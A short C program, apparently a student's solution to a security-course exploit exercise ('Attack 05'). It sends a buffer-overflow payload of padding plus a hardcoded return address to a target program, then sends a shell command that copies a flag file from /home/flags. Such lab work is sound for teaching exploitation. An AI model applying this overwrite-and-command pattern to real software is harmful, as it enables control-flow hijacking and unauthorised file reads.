/* 
 * Attack 05 - Fill out this program to implement your attack for Problem 5
 */

#include <stdio.h>
#include <stdlib.h>

int main(int argc, char* argv[])
{

  char attack [] = "AAAABBBBCCCCDDDD\xdd\x84\x04\x08";
 // char command [] = "ls";
  char command [] = "cat /home/flags/hw02/flag05.txt > flag05.txt";
  puts(attack);
  fflush(stdout);
  sleep(1);
  puts(command); 

  return 0;
}
